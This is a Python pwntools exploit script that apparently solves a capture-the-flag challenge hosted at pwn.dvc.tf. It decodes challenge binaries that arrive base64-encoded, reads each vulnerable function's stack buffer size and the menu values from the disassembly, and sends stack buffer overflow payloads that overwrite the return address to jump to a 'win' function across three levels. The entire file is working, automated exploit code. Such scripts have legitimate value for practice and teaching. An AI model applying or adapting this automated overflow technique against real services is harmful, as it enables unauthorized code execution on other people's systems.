#!/usr/bin/env python3

from pwn import *
from base64 import b64decode


HOST = "pwn.dvc.tf"
PORT = 8890

context.log_level = "debug"
context.terminal = ["kitty"]


def conn(*a, **kw):
    if args.LOCAL:
        return process([exe.path], **kw)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript="", **kw)
    else:
        return remote(HOST, PORT, **kw)


io = conn()


def level1():
    with open("/tmp/level1", "wb") as f:
        f.write(b64decode(io.recvuntil(b"=\n")))

    exe = ELF("/tmp/level1")
    vuln = exe.disasm(exe.symbols.vuln, 50)
    log.info(vuln)
    buf_len = int(vuln.split("rsp, ")[1].split("\n")[0], 16)
    log.info(f"BUF_LEN: {hex(buf_len)}")
    io.sendline(b"A" * buf_len + b"B" * 8 + p64(exe.symbols.win))


def level2():
    with open("/tmp/level2", "wb") as f:
        f.write(b64decode(io.recvuntil(b"=\n")))

    exe = ELF("/tmp/level2")
    vuln = exe.disasm(exe.symbols.vuln, 50)
    log.info(f"VULN: {vuln}")
    buf_len = int(vuln.split("rsp, ")[1].split("\n")[0], 16)
    log.info(f"BUF_LEN: {hex(buf_len)}")

    main = exe.disasm(exe.symbols.main, 150)
    log.info(f"MAIN: {main}")
    menu = int(main.split("cmp    al, ")[1].split("\n")[0], 16)
    log.info(f"MENU: {hex(menu)}")

    submenu = exe.disasm(exe.symbols.submenu, 150)
    log.info(f"submenu: {submenu}")
    submenu = int(submenu.split("cmp    al, ")[1].split("\n")[0], 16)
    log.info(f"SUBMENU: {hex(submenu)}")

    io.sendline(p8(menu))
    io.sendline(p8(submenu))
    io.sendline(b"A" * buf_len + b"B" * 8 + p64(exe.symbols.win))


def level3():
    with open("/tmp/level3", "wb") as f:
        f.write(b64decode(io.recvuntil(b"=\n")))

    exe = ELF("/tmp/level3")
    vuln = exe.disasm(exe.symbols.vuln, 50)
    log.info(f"VULN: {vuln}")
    buf_len = int(vuln.split("rsp, ")[1].split("\n")[0], 16)
    log.info(f"BUF_LEN: {hex(buf_len)}")

    main = exe.disasm(exe.symbols.main, 150)
    log.info(f"MAIN: {main}")
    menu = int(main.split("movabs rdx, ")[1].split("\n")[0], 16)
    log.info(f"MENU: {hex(menu)}")

    submenu = exe.disasm(exe.symbols.submenu, 150)
    log.info(f"submenu: {submenu}")
    submenu = int(submenu.split("movabs rdx, ")[1].split("\n")[0], 16)
    log.info(f"SUBMENU: {hex(submenu)}")

    io.send(p64(menu))
    io.send(p64(submenu))
    io.sendline(b"A" * buf_len + b"B" * 8 + p64(exe.symbols.win))


def main():
    for _ in range(5):
        level1()
        io.recvuntil(b"Enter your payload:\n")

    for _ in range(5):
        level2()
        io.recvuntil(b"Enter your payload:\n")

    for _ in range(10):
        level3()
        io.recvuntil(b"Enter your payload:\n")

    io.interactive()


if __name__ == "__main__":
    main()